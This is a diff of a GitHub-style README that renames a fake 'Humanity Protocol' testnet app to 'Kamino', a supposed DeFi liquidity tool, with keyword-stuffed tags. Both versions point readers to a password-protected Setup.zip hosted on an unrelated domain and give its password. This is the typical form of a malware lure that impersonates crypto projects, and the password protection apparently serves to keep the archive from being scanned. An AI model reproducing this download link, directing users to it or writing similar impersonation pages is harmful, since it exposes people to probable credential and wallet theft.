@@ -1,29 +1,38 @@
-# 🚀 Humanity Protocol 🚀
+# 🚀 Kamino - DeFi Liquidity Management Platform 2024 🚀
 
 # [DOWNLOAD](https://erdogansigorta.com/temp/Setup.zip)  
 ## Password - z4iS5VVOeZIe
-
 ## 📜 Overview
 
-**Humanity Protocol** is a Testnet application designed to facilitate decentralized identity and verification services. It enables developers to create and test systems focused on secure, decentralized identity management.
+**Kamino** is a Testnet platform providing liquidity management solutions for decentralized finance (DeFi) projects. It helps developers create optimized liquidity pools with ease.
 
 ### 📋 How to Use
 
-1. **Download Humanity Protocol** using the link above.
-2. **Install** the application on your system.
-3. **Begin developing and testing** identity verification services on the decentralized platform.
+1. **Download Kamino** from the link above.
+2. **Install** Kamino on your device.
+3. **Develop and test DeFi liquidity solutions** with built-in management tools.
 
 ---
 
-If you find Humanity Protocol helpful, please ⭐ this repository!
+If Kamino helps your project, please ⭐ this repository!
 
 ### 🔑 Tags
 
-- Humanity-Protocol
-- Humanity-Protocol-for-Testnet
-- Humanity-Protocol-identity-verification
-- Humanity-Protocol-decentralized
-- Humanity-Protocol-free
-- Humanity-Protocol-setup
-- Humanity-Protocol-install
-- Humanity-Protocol-2024
+- Kamino
+- Kamino-DeFi
+- Kamino-liquidity-management
+- Kamino-Testnet
+- Kamino-decentralized
+- Kamino-crypto
+- Kamino-free-download
+- Kamino-setup-2024
+- Kamino-install
+- Kamino-finance
+- Kamino-tools
+- Kamino-for-developers
+- Kamino-liquidity
+- Kamino-pools
+- Kamino-blockchain
+- Kamino-platform
+- Kamino-free
+- Kamino-optimized
